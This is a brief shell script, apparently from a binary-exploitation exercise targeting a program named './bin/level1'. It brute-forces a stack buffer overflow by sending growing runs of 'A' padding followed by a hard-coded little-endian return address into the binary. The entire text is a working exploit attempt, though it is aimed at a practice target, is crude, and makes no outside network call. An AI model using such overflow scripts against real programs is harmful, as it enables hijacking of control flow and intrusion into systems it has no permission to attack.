payload='\x44\x84\x04\x08'
bin=./bin/level1
for i in $(seq 0 0xffffffff); do
    python3 -c 'print("A"*'$i' + "'$payload'")' | $bin 
done